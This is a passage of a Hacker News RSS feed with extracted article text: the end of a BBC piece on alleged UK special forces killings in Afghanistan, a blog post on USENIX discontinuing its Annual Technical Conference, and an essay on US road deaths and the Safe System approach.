src="https://ichef.bbci.co.uk/news/480/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp" loading="lazy" alt="A head-and-shoulders portrait of Bruce Houlder, a white man with grey hair, wearing a navy suit, a pink shirt and a blue tie, looking to the side of the camera with the background out of focus"></p></div><p data-component="caption-block"><figcaption>Former director of service prosecutions Bruce Houlder said he hoped the inquiry would examine what Mr Cameron knew</figcaption></p></figure><div data-component="text-block"><p>The Afghan president was "so consistent with his complaints about night raids, civilian casualties and detentions that there was no senior Western diplomat or military leader who would have missed the fact that this was a major irritant for him," said Gen Douglas Lute, a former US ambassador to Nato.</p><p>Gen Lute said it would have been "extraordinarily unusual if there were a claim against British forces that the British chain of command was not aware of".</p><p>A spokesperson for Lord Cameron told Panorama that "to the best of Lord Cameron's recollection" the issues raised by President Karzai were about Nato forces in general and that "specific incidents with respect to UK Special Forces were not raised".</p><p>The spokesperson also said that it was "right that we await the official findings of the Inquiry", adding that "any suggestion that Lord Cameron colluded in covering up allegations of serious criminal wrongdoing is total nonsense."</p><p>Unlike many other countries, including the US and France, the UK has no parliamentary oversight of its elite special forces regiments. Strategic responsibility for their actions falls ultimately to the prime minister, along with the defence secretary and head of special forces.</p><p>Bruce Houlder KC - a former director of service prosecutions, responsible for bringing charges and prosecuting those serving in the Armed Forces - told Panorama that he hoped the public inquiry would examine the extent of Lord Cameron's knowledge of alleged civilian casualties on British special forces operations.</p><p>"You need to know how far the rot went up," Mr Houlder said.</p></div><div data-component="text-block"><p><i id="get-in-touch-using-securedrop,-a-highly-anonymous-and-secure-way-of-whistleblowing-to-the-bbc-which-uses-the-tor-network.">Get in touch using SecureDrop, a highly anonymous and secure way of whistleblowing to the BBC which uses the TOR network.</i></p><p><i id="or-by-using-the-signal-messaging-app,-an-end-to-end-encrypted-message-service-designed-to-protect-your-data.">Or by using the Signal messaging app, an end-to-end encrypted message service designed to protect your data.</i></p><p><a target="_blank" href="http://kt2bqe753wj6dgarak2ryj4d6a5tccrivbvod5ab3uxhug5fi624vsqd.onion/"><i id="securedrop">SecureDrop</i></a><i id="or-signal:-0044-7714-956-936"> or Signal: 0044 7714 956 936</i></p><p><i id="please-note-that-the-securedrop-link-will-only-work-in-a-tor-browser.-for-information-on-keeping-secure-and-anonymous,">Please note that the SecureDrop link will only work in a Tor browser. For information on keeping secure and anonymous, </i><a target="_self" href="https://www.bbc.co.uk/news/uk-60972903"><i id="here's-some-advice-on-how-to-use-securedrop">here's some advice on how to use SecureDrop</i></a><i id=".">.</i></p><p><i id="it's-proved-a-really-important-way-for-people-to-get-in-touch-with-us-in-the-past.">It's proved a really important way for people to get in touch with us in the past.</i></p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[RIP Usenix ATC (128 pts)]]></title>
            <link>https://bcantrill.dtrace.org/2025/05/11/rip-usenix-atc/</link>
            <guid>43964827</guid>
            <pubDate>Mon, 12 May 2025 16:29:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bcantrill.dtrace.org/2025/05/11/rip-usenix-atc/">https://bcantrill.dtrace.org/2025/05/11/rip-usenix-atc/</a>, See on <a href="https://news.ycombinator.com/item?id=43964827">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <main aria-label="Content">
        <article>
            
            
            <div>
                <p>USENIX made the decision this week to
<a href="https://www.usenix.org/blog/usenix-atc-announcement">discontinue its flagship
Annual Technical Conference</a>.  When USENIX was started in 1975 — before the
Internet, really — conferences were the fastest vector for practitioners to
formally share their ideas, and USENIX ATC flourished.  Speaking for myself, I
came up lionizing ATC:  I was an undergraduate in the early 1990s, and
programs like the
<a href="https://www.usenix.org/legacy/publications/library/proceedings/bos94/index.html">USENIX
Summer 1994</a> conference felt like Renaissance-era Florence for systems
practitioners.</p>
<p>When we developed DTrace in the early 2000s, we knew that there was no better
venue to announce it to the world than USENIX ATC.  We put a lot of effort
into the resulting paper,
<a href="https://www.usenix.org/legacy/publications/library/proceedings/usenix04/tech/general/full_papers/cantrill/cantrill.pdf">Dynamic
Instrumentation of Production Systems</a> — and I was elated when it was
accepted for USENIX ATC 2004.</p>
<p>The conference itself was…​ surprising.  This was not the USENIX of a decade
prior; the conference was decidedly academic, and in the strictest sense: all
of the presentations were from PhD students seeking out academic work.  I
wrote about this (with characteristic bluntness?) after I returned from the
conference, asking
<a href="https://bcantrill.dtrace.org/2004/07/06/whither-usenix/">whither USENIX?</a> This
blog post engendered quite a bit of discussion (the bygone era of meaningful
discourse in blog comments!) — and an especially thoughtful long-form
<a href="https://web.archive.org/web/20081006150917/https://www.allthingsdistributed.com/historical/archives/000482.html">response
from Werner Vogels</a>.</p>
<p>Werner’s thoughts in turn inspired
<a href="https://bcantrill.dtrace.org/2004/07/08/whither-usenix-part-ii/">my own
response</a>, where I in particular looked at the Program Committee formulation — and became alarmed by the total collapse in industrial participation.  Ted
Leung
<a href="https://www.sauria.com/py-bin/pyblosxom/pyblosxom.cgi/2004/07/08#1007">noted
this</a>, and referred us to <a href="http://herpolhode.com/rob/utah2000.pdf">Rob Pike’s
infamous polemic</a>.  I wrote again on this later that summer (those halcyon
days immediately before the delightful distraction of a newborn!), asking
<a href="https://bcantrill.dtrace.org/2004/07/13/whither-systems-research/">whither
systems research?</a></p>
<p>The summer of 2004 was a long time ago; the occasion of ATC’s discontinuance
affords us the opportunity to look back on all of this now two decades on.</p>

<p>What happened here?  As in so many other dimensions, I think our discussion
and consternation in 2004 plainly underestimated the importance and impact of
open source.  Go and Rust do not arise — cannot arise — in a proprietary
world.  These are also not the work of hobbyists:  they were written by
professionals for professionals in a professional capacity.  And of course, it
isn’t just languages:  in all manners of systems software, the leading edge of
innovation is in deployed, production, open source systems.  Open source
systems are not without
their own complexity and conflict, of course — viz. the recent
<a href="https://oxide-and-friends.transistor.fm/episodes/shootout-at-the-cncf-corral">shoot-out
at the CNCF corral</a> — but these are literal sideshows:  in the last two decades
new, innovative, production-oriented systems <strong>have</strong> thrived (whether
we call those systems "research" or not).  Importantly, the vector for
publishing for the practitioner is via repositories rather than
being confined to only formal writing.</p>
<p>Second, as for USENIX ATC itself, the conference itself plainly struggled.
The problems that I had seen with respect to an overly academic conference
seemingly metastasized, and for me, the conference drifted further and further
from the shores of practitioner relevance.  (For practitioners seeking to
formally publish, I recommended that they instead target <em>Communications of
the ACM</em> via
<a href="https://bcantrill.dtrace.org/2009/05/14/queue-cacm-and-the-rebirth-of-the-acm/">its
practitioner-focused content</a>.)</p>
<p>Seemingly unaware of my own ambivalence about the conference, however, USENIX
asked me to return in 2016 to give the ATC keynote.  With the caution that
<a href="https://lobste.rs/s/ctt2il/what_does_process_submitting_paper#c_ngj36s">some
found my presentation offensive</a>, my keynote,
<a href="https://www.youtube.com/watch?v=gAEiXWO44bQ">A Wardrobe for the Emperor</a>,
outlined my belief that computer science had erred grievously in insisting
upon conferences (rather than journals) as a publishing vehicle — and that
USENIX and its conferences had been a casualty.  And while my keynote may have
been particularly candid, I am not the only one who saw this: Rik Farrow wrote
up an
<a href="https://www.usenix.org/system/files/login/articles/login_fall16_01_farrow.pdf">excellent
piece on my talk for ;login:</a> giving context that I was unaware of — namely
that inside of USENIX, this was an issue of concern reaching back decades.  So
USENIX ATC did finally succumb, and I <strong>do</strong> view it as a casualty here,
asphyxiated by the rough love of academic computer science and its inability
to grow beyond the conference model of publishing.</p>
<p>That said, while ATC may have died in the arms of academia, it would be unfair
to say that academia alone killed it:
<a href="https://oxide-and-friends.transistor.fm/episodes/conferences-in-tech">as Adam
and I discussed with Stephen O’Grady, KellyAnn Fitzpatrick and Theo
Schlossnagle</a>, conferences are hard — and in-person conferences are
especially so.  While they certainly lose something in the process,
it feels like online conferences give us indisputably (overwhelmingly!) more
bang for the buck; it felt like some
decline of USENIX’s in-person conference model was inevitable.  This is not to
say that in-person models are impossible, of course, just that they needed
to look different.
(Selfishly, I wish USENIX had developed
conferences like the
<a href="https://bcantrill.dtrace.org/2016/12/21/reflections-on-systems-we-love/">Systems
We Love</a> event that we ran in 2016 — selfish because I’d much rather attend
than organize!)</p>
<p>On ATC, I think we can fairly grieve what we lost:  ATC was — at its height — a singular forum for presenting pioneering systems work.  And even as it
declined in attendance, it retained this spirit in its best works.  Certainly,
I view our own work at ATC in 2004 as striving to be in this tradition — and I think
that it’s apt and fitting that last year’s Best Paper (which will stand as the
penultimate USENIX ATC Best Paper) is on
<a href="https://www.microsoft.com/en-us/research/articles/usenix-atc-2024-best-paper-how-microsoft-is-improving-cloud-ai-infrastructure-reliability/">a system to validate AI
infrastructure at scale</a>, deployed on a real, production system, reporting
results that are relevant to the practitioner.</p>
<p>So RIP, USENIX ATC. I know we had a complicated relationship over the years,
but it was a good run. Thank you to everyone at USENIX who gave us an
important forum for some of our biggest and boldest ideas — and we’ll always
have the summer of 1994.</p>

            </div>
        </article></main>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Traffic Fatalities Are a Choice (111 pts)]]></title>
            <link>https://asteriskmag.com/issues/10/traffic-fatalities-are-a-choice</link>
            <guid>43964304</guid>
            <pubDate>Mon, 12 May 2025 15:42:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://asteriskmag.com/issues/10/traffic-fatalities-are-a-choice">https://asteriskmag.com/issues/10/traffic-fatalities-are-a-choice</a>, See on <a href="https://news.ycombinator.com/item?id=43964304">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	
	<div data-mode="add-marker">
		<p><img id="marker" src="https://asteriskmag.com/assets/img/asterisk_mark.png" title="save highlight"></p><!-- <a href="https://asteriskmag.com/about/#highlights"><img id="help" src="https://asteriskmag.com/assets/img/asterisk_help.png" title="about highlights"></a> -->
		
	</div>

	<section>
				
		 			<h2>
				   
					<span>Abi Olvera</span>
							</h2>
			</section>
	
			<section id="rangyscope">
					<p>America’s roads are more dangerous than those of almost every country in the developed world. We know how to change that.</p>
				<div>
											<div><p>You are as likely to die driving on an American road as you are driving in Kazakhstan or Kyrgyzstan. The American traffic-related death rate ranks 87th in the world. At 12.8 deaths per 100,000 people, it is double that of Greece, triple that of Austria, and six times more than Japan. In 2022, more than 42,000 people died on American roads, and more than two million — 1 in every 170 — required emergency medical care from automobile-related accidents. The total economic cost, in medical expenses and loss of life, amounted to an estimated $470 billion.&nbsp;</p><p>This is not an inevitability. It is a policy decision that the federal and state governments continue to affirm. Indeed, if the United States had matched the rate of improvement in road safety since the 1970s seen in, for example, the Netherlands, Sweden, or Spain, it would have prevented 2 out of every 3 road deaths, saving 25,000 lives last year alone.&nbsp;</p><p>It’s tempting to argue — and some do — that such drastic reductions are easier to accomplish in small, dense, European countries. But even relatively car-centric countries like Britain, Canada, and Australia cut road deaths by nearly half between 1979 and 2002. In the United States, they decreased by just <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4103211/%23:~:text=Go%2520to:-,RESULTS,for%2520the%25203%2520comparison%2520countries,%2520an%2520entirely%2520different%2520conclusion%2520is%2520unavoidable.,-Figure%25201a">16% over the same time</a>.&nbsp;</p><p>What did Sweden, Spain, and other countries do that the US did not? Each of the countries that reduced their road deaths used the same method: they implemented a set of urban planning decisions — and a philosophy which informs them — now called the <a href="https://publichealth.jhu.edu/2021/report-safe-system-approach-could-dramatically-reduce-road-deaths-while-improving-equity">Safe System</a> approach.&nbsp;</p></div>
											<p><h2><strong>Safe System origins</strong></h2>
</p>
											<div><p>At its core, the Safe System approach acknowledges that human error while driving is inevitable. Thus, road designers and urban planners should engineer environments to guide safer behaviors. Smart design ensures that when human error happens, it does not lead to severe crashes by, for example, physically separating pedestrians from high speed car traffic, and by designing roads that don’t facilitate high speeds.&nbsp;</p><p>The philosophy traces its origins to road safety activism that first began in the Netherlands in the 1970s. The Netherlands at that time had a road fatality rate 15% higher than that of the United States. It reached an apex in 1971, when more than 3,300 people, including more than 400 children,were killed in driving accidents — a fatality rate equivalent to 25 per 100,000 people. Out of public outrage was born the <em>Stop de Kindermoord</em> or Stop the Child Murder movement, spearheaded by bereaved parents and civil society organizations who demanded safer streets across the country.&nbsp;</p><p>Activists within <em>Stop de Kindermoord</em> were pragmatic. They worked with urban planners and local communities to develop innovative, safer street designs. One result was the separated bicycle tracks for which the Netherlands is now famous. So, too, was a new street design known as <em>woonerf</em>, or <em>living street</em>, which used physical elements like bends, curves, and trees to deliberately slow traffic and provided for shared space between pedestrians, cars, and bicycles.&nbsp;</p><p>Through continued activism — and partially aided by the oil crisis of 1974, which made driving less economically attractive — many designs were taken up by politicians who <a href="https://www.bloomberg.com/news/articles/2022-01-26/u-s-lessons-from-the-dutch-traffic-safety-revolution?embedded-checkout=true%23:~:text=What%2520changed%2520in,Dutch%2520streets.">codified new rules</a> on street design, funding, and governance. Over decades, the Netherlands continued to improve its road design, pioneering the behavioral-engineering approach. For example, the Dutch developed the concept of “<a href="https://www.vox.com/the-big-idea/2016/11/30/13784520/roads-deaths-increase-safety-traffic-us%23:~:text=The%2520Dutch%2520also,the%2520first%2520place.">self-explaining</a>” roads, which intuitively guide drivers to safe speeds via engineering features.&nbsp;</p><p>Yet progress was not linear. Many road improvements were implemented in <a href="https://link.springer.com/referenceworkentry/10.1007/978-3-030-76505-7_12">more piecemeal fashion</a>, not country-wide but neighborhood by neighborhood, city by city. After early success, reductions in road fatalities stalled through the 1980s. Recognizing the need to catalyze further change, in the late 1980s, the Dutch States General set an ambitious goal: a 50% reduction in road deaths by 2010.&nbsp;</p><p>To meet those goals, the Netherlands enacted what is <a href="https://colab.ws/articles/10.1007/978-3-030-23176-7_12-1%23:~:text=effective%2520interventions%2520were%2520taken,experiences%2520in%2520the%2520decades%2520before">cited</a> as the very first “system approach” to road safety — the Dutch then called it “Sustainable Safety” — which applied three principles to road design that look like an early version of today’s conception of Safe System: a hierarchical network of road types, each with its own design and speed limits; “homogeneity,” which uses speed management and directional separation to manage interactions between vehicles of different masses; and predictability for drivers via consistent design principles.&nbsp;</p><p>These changes required a massive implementation program. Between 1998 and 2008, for instance, the percentage of roads in Dutch cities that were zoned at 30 km/h increased from 15% to 70%, while the percentage of rural roads zoned at 80km/h dropped from 97% to 43%. Over the same time period, fatality rates dropped steadily — 5.3% per year — compared to only 1.8% in the preceding 10 years.&nbsp;</p></div>
											<p><h2><strong>Safe System goes global</strong></h2>
</p>
											<div><p>Around the same time the Dutch began implementing such widespread changes, Sweden adopted an even more ambitious vision. In 1997, the Swedish Parliament passed a road traffic safety bill that set a goal of zero deaths or serious injuries on Sweden’s roads. They called it Vision Zero.</p><p>But it also came with specific innovations that sought cost-effective solutions to infrastructural upgrades. Most famously, Sweden developed 2+1 roads, a three lane road where two lanes run in one direction and one in the other, alternating every few kilometers, separated by a cable barrier. This barriers reduces head-on collisions, but still permits faster drivers to overtake slower ones — without having to clear space for a full highway. Rural highways where 2+1 roads were installed saw a 79% reduction in fatalities between 1998 and 2007 compared to those that did not. Crucially, they were relatively inexpensive to install.</p><p>The Netherlands and Sweden provided proof that a systemic safety approach significantly reduces fatalities — and other countries took notice. In 2008, the OECD published a landmark report which built on findings from both countries to further codify what was now being called the Safe System approach. It is defined somewhat differently across the world, but its essential components include not accepting the loss of life, tailoring interventions to local contexts in a way that is tolerant of human error, sharing responsibility across the system rather than blaming individuals, and applying solutions across similar locations throughout a system.</p></div>
											<div><figure>
      <p><img src="https://asteriskmag.com/media/pages/issues/10/traffic-fatalities-are-a-choice/9ec4dd2e15-1745267587/olvera.png" alt="">
  </p>
    <p>
    Mothers join hands with their children to block the intersection of Hellerman and Walker Streets in a plea for a stop sign on Hellerman Street after a woman was killed in an auto crash at the scene. Published in the <em>Philadelphia Evening Bulletin</em>. Courtesy Temple University Libraries.  </p>
  </figure>
</div>
											<div><p>When <a href="https://publichealth.jhu.edu/sites/default/files/2023-03/recommendations-of-the-safe-system-consortium.pdf">adopted </a>widely,<sup>
    <!-- <a id="fnref-1" href="#fn-1"> -->
    <span id="fnref-1">
        1    </span>
    <!-- </a> -->
</sup>
 results are striking. Between 1990 and 2017, fatalities dropped in Australia by 47%, New Zealand by 48%, Sweden by 67%, the Netherlands by 55%, and in Spain by 80%.</p><p>It is common to assume that Safe System is not possible in the United States, typically due to some combination of high car ownership, car dependency, and large proportion of rural expanse. Yet there are many countries that contradict those excuses. Canada and Finland have similar or higher rates of <a href="https://en.wikipedia.org/wiki/List_of_countries_and_territories_by_motor_vehicles_per_capita">car ownership</a> as the US, yet have much lower fatality rates. In Canada specifically, people have a <a href="https://www.bloomberg.com/news/features/2022-11-03/why-us-traffic-safety-fell-so-far-behind-other-countries%23:~:text=For%2520proof,%2520look%2520no%2520further%2520than%2520Canada,%2520an%2520equally%2520spacious%2520and%2520car-centric%2520neighbor%2520where%2520the%2520likelihood%2520of%2520dying%2520in%2520a%2520crash%2520is%252060%2525%2520lower.">60% lower likelihood of dying in a crash</a> than in the United States, despite being equally spread out.&nbsp;</p></div>
											<p><h2><strong>What does this actually look like?&nbsp;</strong></h2>
</p>
											<div><p>Over the years, urban planners have refined Safe System road modifications in a way that is tailored to American urban environments. What does this look like in practice?&nbsp;</p><p>The U.S. model typically encourages wide lanes and corners to increase driver visibility, but this has the unintended consequence of encouraging cars to go through intersections faster, and and thereby decreasing the peripheral vision they might have retained at a slower speed. Instead, the Safe System intersection is designed to limit car speed and facilitate eye contact between users. It does so by expanding pedestrian areas via curb extensions or bumpouts, narrowing crosswalks, and removing parking within 20-25 feet of an intersection. The crosswalks and narrowing of the lanes encourages cars to slow and to stop well ahead of the crosswalk, while bumpouts shorten the distance pedestrians must be in the road.&nbsp;</p><p>A handful of U.S. cities have individually implemented some aspects of these safer design approaches. Chicago has installed protected bike lanes and pedestrian safety islands, which function similarly the the intersection describe above by making crosswalks shorter and increasing visibility. Baltimore and Washington, D.C.’s improved intersections use pylons and other forms of road furniture to force cars to make perpendicular (rather than angular) turns. This not only slows traffic, but permits turning cars fuller visibility of the crosswalk.&nbsp;</p></div>
											<div><figure>
      <p><img src="https://asteriskmag.com/media/pages/issues/10/traffic-fatalities-are-a-choice/5124ea913d-1745267634/olvera_diagram_1.png" alt="">
  </p>
  </figure>
</div>
											<div><figure>
      <p><img src="https://asteriskmag.com/media/pages/issues/10/traffic-fatalities-are-a-choice/f4b60ce098-1745267654/olvera_diagrams_2.png" alt="">
  </p>
    <p>
    Diagram based on NACTO, the National Association of City Transportation Officials, a coalition of the Departments of Transportation in North American cities.&nbsp;  </p>
  </figure>
</div>
											<div><p>Whereas the Netherlands clearly differentiates <a href="https://www.youtube.com/watch?v=ORzNZUeUHAM">roads and streets</a> — as do Germany, Spain, and France — the US is known for having “stroads,” roads where cars reach high speeds yet must also avoid drivers entering from adjacent businesses and homes. The majority of fatal crashes in American cities happen on these “stroads,” and impact pedestrians and cyclists in particular.&nbsp;</p><p>Stroads, however, can be modified to serve all users, including roadside businesses, shoppers, drivers, and pedestrians. For example, La Jolla Boulevard, just a few blocks from the beach in San Diego, was previously a five lane road that served 23,000 vehicles per day. Renovations reduced it to two lanes, with roundabouts, parking, bike lanes, and varied sidewalks. Traffic dropped only slightly — to&nbsp;<a href="https://www.cnu.org/publicsquare/2022/06/21/seven-stroads-have-been-converted-streets"> 22,000 vehicles</a> — but the boulevard shifted from being unsafe for pedestrians to a walkable, inviting street. Average vehicle speeds dropped from 40-45 mph to 19 mph, noise levels decreased by 77%, retail sales increased by 30%, and traffic crashes plummeted by 90%.</p><p>There are other success stories. As of 2024, Hoboken, New Jersey has not had a single traffic fatality in seven years, <a href="https://www.bloomberg.com/news/articles/2022-11-25/the-us-cities-where-vision-zero-traffic-safety-fixes-are-working?embedded-checkout=true">mostly thanks to inexpensive intersection design upgrades</a>. And larger cities such as New York, Chicago, and Washington D.C. also experienced <a href="https://www.vox.com/the-big-idea/2016/11/30/13784520/roads-deaths-increase-safety-traffic-us%23:~:text=Where%2520these%2520strategies%2520have%2520been%2520successfully%2520implemented%2520%25E2%2580%2594%2520New%2520York%2520City,%2520Portland,%2520Cambridge,%2520and%2520Seattle,%2520along%2520with%2520Washington,%2520DC%2520%25E2%2580%2594%2520biking%2520has%2520skyrocketed%2520and%2520traffic%2520fatality%2520rates%2520have%2520dropped%2520at%2520a%2520much%2520higher%2520rate%2520than%2520in%2520other%2520cities">fatality reductions</a> through the aughts and early 2010s, via various improvements. In DC, in particular, traffic fatalities fell from 9 per 100,000 residents to 3 between 2000 and 2012.&nbsp;</p><p>But nationwide, some of these gains have reversed. During the pandemic, road fatalities increased, particularly during late nights and early mornings. And while congestion has come back to pre-pandemic levels, road fatalities have stayed high.&nbsp;</p><p>Experts seem to agree that the pandemic changed driving behavior: the increase in vehicle occupant deaths appears to be<a href="https://usa.streetsblog.org/2024/08/01/study-the-real-reasons-pedestrian-deaths-surged-along-with-covid-19%23:~:text=Yes,%2520deaths%2520did,not%2520wearing%2520seatbelts.%2522"> heavily weighted towards people who weren’t wearing seatbelts</a>. Speeding, distracted driving, driving without a license, and driving under the influence of alcohol or drugs rates have also increased.&nbsp;</p><p>But it’s not just COVID: U.S. pedestrian fatalities have increased <a href="https://aaafoundation.org/pedestrian-fatalities-on-urban-arterial-roads-at-night-an-in-depth-crash-analysis-and-three-case-studies/">80%</a> since 2009. Many factors contribute to a deadlier environment: the increase in average car size and weight, <a href="https://www.forbes.com/sites/dalebuss/2022/10/30/why-traffic-fatalities-spiked-during-pandemic--and-are-staying-high/%23:~:text=Twenty-three%2520percent,people,%25E2%2580%259D%2520Hayes%2520said.">smartphone use</a>, and large population growth in metro areas with the highest per-capita pedestrian death rates in states like Florida, Texas, and Arizona. Another factor appears to be the suburbanization of poverty. More <a href="https://www.nytimes.com/interactive/2023/12/11/upshot/nighttime-deaths.html%23:~:text=Nationwide,%2520the,more%2520local%2520roads.">lower-income Americans</a> who rely on public transit now live in areas built around the most dangerous roads.<sup>
    <!-- <a id="fnref-2" href="#fn-2"> -->
    <span id="fnref-2">
        2    </span>
    <!-- </a> -->
</sup>
&nbsp;</p></div>
											<p><h2><strong>Vision vs.<em> </em>action</strong></h2>
</p>
											<div><p>The United States still lacks a cohesive, <em>national</em> effort to reduce road fatalities. More than 60 American cities have signed onto Vision Zero commitments, but implementation of comprehensive reforms is rare. This wouldn’t necessarily mean a stall in progress — the Dutch method was also incremental — but factors within the American road system make tackling even the highest leverage changes challenging.&nbsp;</p><p>Cities often lack control over the roads that run through them, especially the most dangerous thoroughfares. Municipal governments only manage smaller streets, as major arterial roads and highways are generally owned or managed by state DOTs. Most state DOTs only require compliance with the Federal Highway Administration’s Manual for Uniform Traffic Control Devices, which sets baseline rules for street design and traffic control.&nbsp;</p><p>Prior to 2023, the MUTCD set speed limits based not on safety but on the speed that 85% of drivers instinctively follow. It wasn't <a href="https://visionzeronetwork.org/mutcd-icymi/">until 2023</a> that MUTCD stopped recommending setting speed limits solely at the 85th percentile rule. It now allows for the consideration of other factors like pedestrian activity and crash frequency, but these are not mandated, and it will take years for post-2023 changes to take effect.</p><p>Ideally, pressure from Washington would force changes at the state level. The U.S. DOT claims to adopt Safe System “as the guiding paradigm to address roadway safety.” But there is no coordinated effort to align Safe System principles with federal budgets and investments — or the MUTCD. Transportation officials have adopted some approaches similar to the Safe System approach, like the "Forgiving Highway" concept designed to mitigate crash consequences, but the U.S. DOT, despite the lip service, stops far short of embracing the holistic safety enhancements championed by Safe System. The result is a piecemeal strategy that primarily focuses on mitigating crash impacts rather than preventing incidents.</p><p>Even when cities do wish to implement changes, <a href="https://www.bloomberg.com/news/articles/2022-11-25/the-us-cities-where-vision-zero-traffic-safety-fixes-are-working?embedded-checkout=true">state DOTs</a> can delay, block, or even overrule local efforts to make roads safer. For example, in 2022 after San Antonio voters approved funding for a "complete street" redesign of two miles of a six-lane street, the Texas DOT unexpectedly <a href="https://www.strongtowns.org/journal/2022/2/8/texas-dot-doubles-down-on-urban-highway-expansions">blocked</a> the project, citing its authority over the road — despite years of collaboration with the city. This reversal was part of Texas DOT’s broader policy to maintain all existing vehicle lanes, aligning with the Texas Republican Party’s stance against road diets.<sup>
    <!-- <a id="fnref-3" href="#fn-3"> -->
    <span id="fnref-3">
        3    </span>
    <!-- </a> -->
</sup>
&nbsp;</p><p>Nor is this purely a red state problem. Nine states, for instance — including purple Maine, New Hampshire, and Wisconsin — prohibit speed cameras. Few states have implemented them at all. Even in places where officials want change, the norms of highway-focused agency culture and focus on free-flowing car traffic make progress difficult. One advocate reports how some state DOT traffic engineers <a href="https://smartgrowthamerica.org/how-a-singular-focus-on-speed-leads-state-dots-to-overspend-and-overbuild/">express discomfort</a> with engineering roads that guide driver decisions. State inertia demonstrates the need for stronger federal support to align transportation policies with safety goals, and possibly grassroots activism to demand that goals are met. Vision Zero can’t be achieved in an environment so myopically focused on optimizing business as usual.&nbsp;</p><p>America still treats road safety as a separate special program, a “nice to have,” not a basic requirement of all projects. While spending $50 billion yearly on roads, the government dedicated just $2.4 billion specifically to reducing traffic deaths in 2022-2023. As former DOT official <a href="https://www.cbsnews.com/news/traffic-deaths-rise-despite-billions-spent-to-make-streets-safer/%23:~:text=%2522I%2520would%2520argue%2520so%2520long%2520as%2520you%2520can%2520easily%2520pick%2520out%2520the%2520safety%2520projects,%2520that's%2520a%2520problem,%2522%2520Osborne%2520said.%2520%2522They%2520should%2520all%2520be%2520safety%2520projects.%2522">Beth Osborne</a> puts it, "I would argue so long as you can easily pick out the safety projects, that's a problem. They should <em>all</em> be safety projects."&nbsp;</p><p>Crucially — and unlike in other countries — this is accepted as business as usual. Public (and congressional) attention on this front remains relatively muted outside of advocacy and grassroots efforts that don’t appear to have the same purchase as those in the Netherlands throughout the 1970s. The instances where road fatalities do reach media attention are more often when car companies are found at fault for flaws, such as the intense Congressional scrutiny over <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4103206/%23:~:text=Over%2520the%2520decade,kill%2520their%2520constituents.">19 deaths</a> linked to sudden unintended acceleration in Toyotas. This tendency is partly driven by the U.S. legal framework, which allows for substantial settlements in cases of vehicle design faults — and otherwise almost only for driver negligence.&nbsp;</p><p>There is no denying that the comprehensive implementation of Safe System in America will be logistically difficult and expensive. But the alternative — one which many European countries decided not to accept decades ago — is some 40,000 deaths every year, double that of gun homicides.&nbsp;</p><p>America's road safety crisis demands a three-pronged transformation that addresses the core issues revealed in successful international models. First, we need a national vision and strategy to prioritize preventing road fatalities. Support at the highest levels would ensure that federal policies attach funding mechanisms to safety requirements, and possibly outcomes. Such changes can be integrated during already-planned maintenance and upgrade cycles, and prioritize the highest-risk corridors that account for a disproportionate share of fatalities.&nbsp;</p><p>Second, comprehensive design reforms must replace outdated planning and design standards and protocols — particularly the MUTCD — that handcuff local and state governments and engineers trying to implement proven safety measures.&nbsp;</p><p>Third, we need to build a culture of urgency across America. A shared conviction that road fatalities are solvable can unite safety advocates, business owners, and community leaders into powerful coalitions. These alliances can challenge the political dynamics that have allowed complacency — even in the face of a decade of rising deaths — to proliferate. Proven solutions exist. What’s missing is our collective will to demand them.&nbsp;</p><p>***</p><p><em>The views expressed in this piece are the author’s and do not represent those of the US government</em></p></div>
										 
				</div>
		
	</section>
	 	<section>
		 		 <p><strong>Abi Olvera</strong> is a writer and researcher. She is the Bulletin of Atomic Scientists AI Fellow and has served as a U.S. diplomat for a decade. She is the author of a scholarship strategy book for low income students. She is a TEDx speaker and has served on boards of organizations working on election reform, road fatalities, global poverty, and tech policy.</p>		 		 		 </section>
	 	<section>            
		<p>
			Published April 2025		</p>
		
		<p>Have something to say? Email us at <a href="mailto:letters@asteriskmag.com">letters@asteriskmag.com</a>.</p>		                        
	</section>	
	
	
	<!--end published content, not coming soon-->

	<!--tags-->
		<section>
		<h4>Further Reading</h4>                
			<p>
				More:  
									<span data-no="tag-1">political science</span>
									<span data-no="tag-2">culture</span>
							</p>
			<!--related articles-->
			             
	</section>
	 
	
	  
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Airweave – Let agents search any app (106 pts)]]></title>
            <link>https://github.com/airweave-ai/airweave</link>
            <guid>43964201</guid>
            <pubDate>Mon, 12 May 2025 15:34:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/airweave-ai/airweave">https://github.com/airweave-ai/airweave</a>, See on <a href="https://news.ycombinator.com/item?id=43964201">Hacker News</a></p>
